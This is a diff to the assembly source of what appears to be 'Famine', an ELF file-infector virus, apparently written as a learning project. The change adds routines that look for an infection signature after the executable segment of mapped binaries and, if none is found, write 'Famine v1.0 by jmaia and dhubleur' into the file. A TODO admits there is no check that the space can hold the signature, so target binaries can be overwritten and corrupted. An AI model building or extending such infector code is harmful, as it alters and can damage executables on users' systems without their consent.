@@ -287,6 +287,19 @@ treat_file:
 	je .unmap_err					; 	goto .unmap_err
 	mov [exec_segment], rax				; exec_segment = res;
 
+	; Check if file has signature
+	mov rdi, [mappedfile]				; has_signature(mappedfile, exec_segment);
+	mov rsi, [exec_segment]				; ...
+	call has_signature				; ...
+	cmp rax, 1					; if (has_signature(mappedfile, exec_segment) == 1)
+	je .unmap_file					; 	goto .unmap_file
+
+	; TODO: check codecave can contain signature
+	; Sign file
+	mov rdi, [mappedfile]				; sign(mappedfile, exec_segment);
+	mov rsi, [exec_segment]				; ...
+	call sign					; ...
+
 	jmp .unmap_file
 
 ; TODO Delete this
@@ -429,6 +442,63 @@ find_exec_segment:
 	%pop
 	ret
 
+; int has_signature(char const *file_map, elf64_phdr *exec_segment)
+; rax has_signature(rdi file_map, rsi exec_segment);
+has_signature:
+	push rsi
+	add rsi, elf64_phdr.p_offset			; offset = exec_segment->p_offset;
+	mov rax, [rsi]					; ..
+	add rdi, rax					; file_map += offset;
+	
+	pop rsi
+	add rsi, elf64_phdr.p_filesz			; size = exec_segment->p_filesz;
+	mov rax, [rsi]					; ..
+	add rdi, rax					; file_map += size;
+
+	mov rsi, 0					; counter = 0;
+	.begin_signature_loop:				; while (true) {
+		mov al, [rdi + rsi]			; 	_c = file_map[counter];
+		mov bl, [signature + rsi]		; 	_signature_c = signature[counter];
+		cmp al, bl				; 	if (_c != _signature_c)
+		jne .end_not_equal			; 		goto end_not_equal;
+		inc rsi					; 	counter++;
+		cmp rsi, len_signature			; 	if (counter == len_signature)
+		je .end_equal				; 		goto end_equal;
+		jmp .begin_signature_loop			; }
+	
+	.end_not_equal:
+		xor rax, rax				; return 0;
+		ret
+
+	.end_equal:
+		mov rax, 1				; return 1;
+		ret
+
+; void sign(char const *file_map, elf64_phdr *exec_segment)
+; void sign(rdi file_map, rsi exec_segment);
+sign:
+	push rsi
+	add rsi, elf64_phdr.p_offset			; offset = exec_segment->p_offset;
+	mov rax, [rsi]					; ..
+	add rdi, rax					; file_map += offset;
+	
+	pop rsi
+	add rsi, elf64_phdr.p_filesz			; size = exec_segment->p_filesz;
+	mov rax, [rsi]					; ..
+	add rdi, rax					; file_map += size;
+
+	mov rsi, 0					; counter = 0;
+	.begin_signature_loop:				; while (true) {
+		mov bl, [signature + rsi]		; 	_signature_c = signature[counter];
+		mov [rdi + rsi], bl			; 	file_map[counter] = _signature_c;
+		inc rsi					; 	counter++;
+		cmp rsi, len_signature			; 	if (counter == len_signature)
+		je .end					; 		goto end;
+		jmp .begin_signature_loop			; }
+	
+	.end:
+		ret
+
 ; DEBUG
 ; void print_string(char const *str);
 ; void print_string(rdi str);
@@ -468,3 +538,5 @@ section .data
 	len_err_msg: equ $ - err_msg
 	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	len_elf_64_magic: equ $ - elf_64_magic
+	signature: db "Famine v1.0 by jmaia and dhubleur"
+	len_signature: equ $ - signature
